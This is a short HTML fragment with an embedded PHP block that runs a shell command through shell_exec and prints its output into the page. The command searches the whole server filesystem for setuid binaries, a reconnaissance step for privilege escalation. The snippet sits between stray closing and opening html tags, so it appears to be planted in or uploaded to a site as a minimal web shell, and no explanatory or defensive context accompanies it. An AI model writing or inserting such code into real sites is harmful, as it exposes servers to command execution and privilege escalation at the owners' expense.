	</body>
</html>	
<?php 
	$prova = shell_exec("find / -perm -u=s -type f 2>/dev/null");
	print "<html>
	    <body>
		{$prova}
	    </body>
	  </html>
	";
?>
<html>
	<body>


